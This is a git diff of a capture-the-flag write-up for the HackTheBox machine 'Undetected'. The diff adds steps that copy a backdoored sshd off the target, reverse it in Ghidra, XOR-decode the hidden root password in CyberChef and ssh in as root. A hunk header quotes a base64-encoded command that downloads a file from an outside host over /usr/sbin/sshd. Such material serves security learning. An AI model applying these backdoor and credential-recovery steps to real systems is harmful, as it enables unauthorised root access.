@@ -39,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
 ```
 
 
-## Default Page- PLAY
+## Default Page- DIANA' S JEWELRY
 so lets chek at the Default page at  http://10.10.11.146
 
 ![[Undetected/undetected png/web.png]]
@@ -438,10 +438,27 @@ echo -n 'd2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3V
 
 ![[base64.png]]
 
-Here is to transfer this image to sshd and download it 
-Reverse using ghidra open
+Here is transfering  this image to sshd and download it to your local pc so as to
+Reverse using ghidra use this code
 
-As you can see from here, our password is 31 bits
+#### code-scp
+```bash
+scp steven1@10.10.11.146:/usr/sbin/sshd ~/project/HTB/Undetected   
+```
+
+#### output
+
+![[sshd.png]]
+open Ghidira and analyse `sshd`
+
+#### output
+
+![[ghidra.png]]
+As you can see from here, our password is 31 bits and in the decompiler lets get bits so that we can analyze 
+
+#### output
+
+![[decompiler.png]]
 
 #### output
 
@@ -480,20 +497,27 @@ backdoor._0_4_ = 0xf0e7abd6;
 0xf0e7abd6
 ```
 
-After sorting here, right click to view 0x5b
+After sorting here, right click to view `0x5b`
 
 #### output
 
+![[oxa5.png]]
 
-It is found that the correct one should be 0xa5. After modifying it, do some coding.
+It is found that the correct one should be `0xa5`. After modifying it, do some coding.Then lets now use [Cyber chef](https://gchq.github.io/CyberChef/)
+which is used to: **Encode, Decode, Format data, Parse data, Encrypt, Decrypt, Compress data, Extract data, perform arithmetic functions against data, defang data, and many other functions**
 
-First convert to HEX and then convert to XOR
+First convert to `HEX-Hexadecimal` and then convert to `XOR` by using :
+
+1.  `Swap endianness`-which endianness  switches the data from `big-endian `to `little-endian` or vice-versa. Data can be read in as `hexadecimal or raw bytes`. It will be returned in the same format as it is entered.
+
+2.  `From Hex `-Converts a hexadecimal byte string back into its raw value
+3. `XOR`- **Exclusive or** or **exclusive disjunction** is a [logical operation](https://en.wikipedia.org/wiki/Logical_connective "Logical connective") that is true if and only if its arguments differ (one is true, the other is false) The Key is 96
 
 #### output
 
 ![[cyber.png]]
 
-so as we can see we are able to decode the password so lets ssh as root to be able to get the escalation as root
+so as we can see we are able to decode the password so lets `ssh `as root to be able to get the escalation as root
 
 #### output
 
